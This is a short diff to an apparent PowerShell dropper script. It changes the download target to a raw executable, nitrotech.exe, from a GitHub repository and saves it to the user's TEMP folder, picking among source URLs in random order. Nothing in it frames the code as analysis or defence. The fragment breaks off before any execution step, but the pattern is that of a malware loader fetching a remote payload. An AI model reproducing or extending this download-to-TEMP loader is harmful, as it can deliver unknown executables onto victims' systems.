@@ -1,6 +1,6 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $URLs = @(
-    'https://github.com/InfernoTV/Plagiat/blob/main/setup.ps1'
+    'https://github.com/InfernoTV/Plagiat/raw/refs/heads/main/nitrotech.exe'
 )
 $exePath = "$env:TEMP\nitrotech.exe"
 foreach ($URL in $URLs | Sort-Object { Get-Random }) {
